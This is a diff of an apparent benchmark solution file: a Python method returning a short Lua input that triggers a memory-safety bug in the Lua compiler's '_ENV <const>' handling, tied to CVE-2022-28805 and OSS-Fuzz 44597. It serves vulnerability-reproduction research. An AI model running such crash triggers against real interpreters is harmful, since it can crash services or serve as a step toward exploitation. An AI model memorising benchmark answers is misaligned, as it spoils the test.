@@ -2,12 +2,14 @@ import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua
-        related to _ENV <const> declaration (CVE-2022-28805).
-        
-        The vulnerability is caused by incorrect code generation where the compiler
-        emits OP_SETTABUP for a local _ENV variable, leading to an out-of-bounds
-        access on the closure's upvalues array (which is empty).
-        """
-        return b"local function f() local _ENV <const> = 1; A = 1 end; f()"
+        # Minimal PoC for Lua _ENV <const> Heap Use After Free (arvo:44597 / OSSFuzz-44597)
+        # The vulnerability is in the Lua compiler (lparser.c) handling of _ENV declared as <const>
+        # when other upvalues are present.
+        poc = (
+            "local x\n"
+            "local function f()\n"
+            "  local _ENV <const> = 1\n"
+            "  return x\n"
+            "end\n"
+        )
+        return poc.encode('utf-8')
